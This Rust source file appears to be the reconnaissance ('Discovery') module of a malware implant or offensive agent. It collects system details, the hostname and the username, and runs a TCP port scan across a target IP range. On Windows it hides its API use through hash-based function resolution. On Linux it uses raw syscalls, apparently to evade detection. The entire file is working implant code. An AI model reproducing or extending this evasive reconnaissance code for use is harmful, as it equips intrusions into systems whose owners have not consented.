use alloc::string::String;
use alloc::format;
use crate::utils::sensitive::SensitiveData;
use zeroize::Zeroize;

#[cfg(target_os = "windows")]
use crate::utils::api_resolver::{hash_str, resolve_function};
#[cfg(target_os = "windows")]
use crate::utils::windows_definitions::*;
#[cfg(target_os = "windows")]
use crate::utils::syscalls::SockAddrIn;

pub struct Discovery;

#[cfg(target_os = "windows")]
#[repr(C)]
#[allow(non_snake_case)]
struct SYSTEM_INFO {
    wProcessorArchitecture: u16,
    wReserved: u16,
    dwPageSize: u32,
    lpMinimumApplicationAddress: PVOID,
    lpMaximumApplicationAddress: PVOID,
    dwActiveProcessorMask: usize,
    dwNumberOfProcessors: u32,
    dwProcessorType: u32,
    dwAllocationGranularity: u32,
    wProcessorLevel: u16,
    wProcessorRevision: u16,
}

impl Discovery {
    pub fn sys_info(&self) -> SensitiveData {
        let output;
        #[cfg(target_os = "windows")]
        unsafe {
            let kernel32 = hash_str(b"kernel32.dll");
            let get_sys_info = resolve_function(kernel32, hash_str(b"GetSystemInfo"));
            
            if get_sys_info.is_null() { 
                output = String::from("Failed to resolve GetSystemInfo"); 
            } else {
                type FnGetSystemInfo = unsafe extern "system" fn(*mut SYSTEM_INFO);
                let mut si: SYSTEM_INFO = core::mem::zeroed();
                core::mem::transmute::<_, FnGetSystemInfo>(get_sys_info)(&mut si);

                output = format!("Processors: {}\nArch: {}\nPageSize: {}", 
                    si.dwNumberOfProcessors, 
                    si.wProcessorArchitecture,
                    si.dwPageSize
                );
            }
        }
        #[cfg(not(target_os = "windows"))]
        {
            unsafe {
                let mut uts: crate::utils::syscalls::Utsname = core::mem::zeroed();
                let mut info: crate::utils::syscalls::Sysinfo = core::mem::zeroed();
                
                let uname_res = crate::utils::syscalls::sys_uname(&mut uts);
                let sysinfo_res = crate::utils::syscalls::sys_sysinfo(&mut info);

                if uname_res == 0 {
                    let mut s = format!("OS: {}\nNode: {}\nRelease: {}\nMachine: {}",
                        c_str_to_str(&uts.sysname),
                        c_str_to_str(&uts.nodename),
                        c_str_to_str(&uts.release),
                        c_str_to_str(&uts.machine)
                    );

                    if sysinfo_res == 0 {
                        let unit = if info.mem_unit == 0 { 1 } else { info.mem_unit as u64 };
                        let total_mb = (info.totalram * unit) / (1024 * 1024);
                        let free_mb = (info.freeram * unit) / (1024 * 1024);
                        
                        s.push_str(&format!("\nUptime: {}s\nLoad: {} {} {}\nMem: {}MB / {}MB\nProcs: {}",
                            info.uptime,
                            info.loads[0] / 65536, info.loads[1] / 65536, info.loads[2] / 65536,
                            free_mb, total_mb,
                            info.procs
                        ));
                    }
                    output = s;
                } else {
                    output = String::from("Linux System Info (Failed)");
                }
            }
        }
        
        let mut v = output.into_bytes();
        let sensitive = SensitiveData::new(&v);
        v.zeroize();
        sensitive
    }

    pub fn net_scan(&self, target: &str) -> SensitiveData {
        let mut result = String::from("Scan results:\n");
        // TCP Connect Scan
        #[cfg(not(target_os = "windows"))]
        unsafe {
            use crate::utils::syscalls::*;
            
            // Expected format: <ip>:<start_port>[-<end_port>]
            let parts: alloc::vec::Vec<&str> = target.split(':').collect();
            if parts.len() == 2 {
                let ip_str = parts[0];
                let port_part = parts[1];
                
                let (start_port, end_port) = if port_part.contains('-') {
                    let range: alloc::vec::Vec<&str> = port_part.split('-').collect();
                    if range.len() == 2 {
                        (range[0].parse::<u16>().unwrap_or(0), range[1].parse::<u16>().unwrap_or(0))
                    } else { (0, 0) }
                } else {
                    let p = port_part.parse::<u16>().unwrap_or(0);
                    (p, p)
                };

                if start_port != 0 && end_port >= start_port {
                    let mut ip_bytes = [0u8; 4];
                    let mut ip_parts = ip_str.split('.');
                    for i in 0..4 {
                        ip_bytes[i] = ip_parts.next().unwrap_or("0").parse().unwrap_or(0);
                    }

                    for port in start_port..=end_port {
                        let sock = sys_socket(2, 1, 0); // AF_INET, SOCK_STREAM
                        if (sock as isize) < 0 { continue; }

                        let addr = SockAddrIn {
                            sin_family: 2,
                            sin_port: port.to_be(),
                            sin_addr: u32::from_ne_bytes(ip_bytes),
                            sin_zero: [0; 8],
                        };

                        if sys_connect(sock, &addr as *const _ as *const u8, 16) == 0 {
                            result.push_str(&format!("{}:{} OPEN\n", ip_str, port));
                        }
                        sys_close(sock);
                    }
                }
            }
        }

        #[cfg(target_os = "windows")]
        unsafe {
            let ws2_32 = hash_str(b"ws2_32.dll");
            let socket_fn = resolve_function(ws2_32, hash_str(b"socket"));
            let connect_fn = resolve_function(ws2_32, hash_str(b"connect"));
            let closesocket = resolve_function(ws2_32, hash_str(b"closesocket"));
            let wsa_startup = resolve_function(ws2_32, hash_str(b"WSAStartup"));

            if !socket_fn.is_null() && !connect_fn.is_null() && !wsa_startup.is_null() {
                type FnWSAStartup = unsafe extern "system" fn(u16, *mut u8) -> i32;
                type FnSocket = unsafe extern "system" fn(i32, i32, i32) -> HANDLE;
                type FnConnect = unsafe extern "system" fn(HANDLE, *const u8, i32) -> i32;
                type FnCloseSocket = unsafe extern "system" fn(HANDLE) -> i32;

                let mut wsa_data = [0u8; 512];
                core::mem::transmute::<_, FnWSAStartup>(wsa_startup)(0x0202, wsa_data.as_mut_ptr());

                let parts: alloc::vec::Vec<&str> = target.split(':').collect();
                if parts.len() == 2 {
                    let ip_str = parts[0];
                    let port_part = parts[1];
                    let (start_port, end_port) = if port_part.contains('-') {
                        let range: alloc::vec::Vec<&str> = port_part.split('-').collect();
                        if range.len() == 2 {
                            (range[0].parse::<u16>().unwrap_or(0), range[1].parse::<u16>().unwrap_or(0))
                        } else { (0, 0) }
                    } else {
                        let p = port_part.parse::<u16>().unwrap_or(0);
                        (p, p)
                    };

                    let mut ip_bytes = [0u8; 4];
                    let mut ip_parts = ip_str.split('.');
                    for i in 0..4 {
                        ip_bytes[i] = ip_parts.next().unwrap_or("0").parse().unwrap_or(0);
                    }

                    for port in start_port..=end_port {
                        let sock = core::mem::transmute::<_, FnSocket>(socket_fn)(2, 1, 0);
                        if sock == (-1isize as HANDLE) { continue; }

                        let addr = SockAddrIn {
                            sin_family: 2,
                            sin_port: port.to_be(),
                            sin_addr: u32::from_ne_bytes(ip_bytes),
                            sin_zero: [0; 8],
                        };

                        if core::mem::transmute::<_, FnConnect>(connect_fn)(sock, &addr as *const _ as *const u8, 16) == 0 {
                            result.push_str(&format!("{}:{} OPEN\n", ip_str, port));
                        }

                        core::mem::transmute::<_, FnCloseSocket>(closesocket)(sock);
                    }
                }
            }
        }
        
        let mut v = result.into_bytes();
        let sensitive = SensitiveData::new(&v);
        v.zeroize();
        sensitive
    }

    pub fn get_hostname(&self) -> SensitiveData {
        let name;
        #[cfg(target_os = "windows")]
        unsafe {
            let kernel32 = hash_str(b"kernel32.dll");
            let get_comp_name = resolve_function(kernel32, hash_str(b"GetComputerNameA"));
            if !get_comp_name.is_null() {
                type FnGetComputerNameA = unsafe extern "system" fn(*mut u8, *mut u32) -> i32;
                let mut buf = [0u8; 256];
                let mut len = 256;
                if core::mem::transmute::<_, FnGetComputerNameA>(get_comp_name)(buf.as_mut_ptr(), &mut len) != 0 {
                    let s = core::slice::from_raw_parts(buf.as_ptr(), len as usize);
                    name = String::from_utf8_lossy(s).into_owned();
                } else {
                    name = String::from("unknown");
                }
            } else {
                name = String::from("unknown");
            }
        }
        #[cfg(not(target_os = "windows"))]
        {
            unsafe {
                let mut uts: crate::utils::syscalls::Utsname = core::mem::zeroed();
                if crate::utils::syscalls::sys_uname(&mut uts) == 0 {
                    name = String::from(c_str_to_str(&uts.nodename));
                } else {
                    name = String::from("linux-target");
                }
            }
        }
        
        let mut v = name.into_bytes();
        let sensitive = SensitiveData::new(&v);
        v.zeroize();
        sensitive
    }

    pub fn get_username(&self) -> SensitiveData {
        let name;
        #[cfg(target_os = "windows")]
        unsafe {
            let advapi32 = hash_str(b"advapi32.dll");
            let get_user_name = resolve_function(advapi32, hash_str(b"GetUserNameA"));
            
            if !get_user_name.is_null() {
                type FnGetUserNameA = unsafe extern "system" fn(*mut u8, *mut u32) -> i32;
                let mut buf = [0u8; 256];
                let mut len = 256;
                if core::mem::transmute::<_, FnGetUserNameA>(get_user_name)(buf.as_mut_ptr(), &mut len) != 0 {
                    let s_len = if len > 0 { len - 1 } else { 0 };
                    let s = core::slice::from_raw_parts(buf.as_ptr(), s_len as usize);
                    name = String::from_utf8_lossy(s).into_owned();
                    buf.zeroize();
                } else {
                    name = String::from("unknown");
                }
            } else {
                name = String::from("unknown");
            }
        }
        #[cfg(not(target_os = "windows"))]
        {
            unsafe {
                let uid = crate::utils::syscalls::sys_getuid();
                if uid == 0 {
                    name = String::from("root");
                } else {
                    name = format!("user-{}", uid);
                }
            }
        }
        
        let mut v = name.into_bytes();
        let sensitive = SensitiveData::new(&v);
        v.zeroize();
        sensitive
    }
}

#[cfg(not(target_os = "windows"))]
fn c_str_to_str(buf: &[u8]) -> &str {
    let len = buf.iter().position(|&c| c == 0).unwrap_or(buf.len());
    core::str::from_utf8(&buf[..len]).unwrap_or("unknown")
}
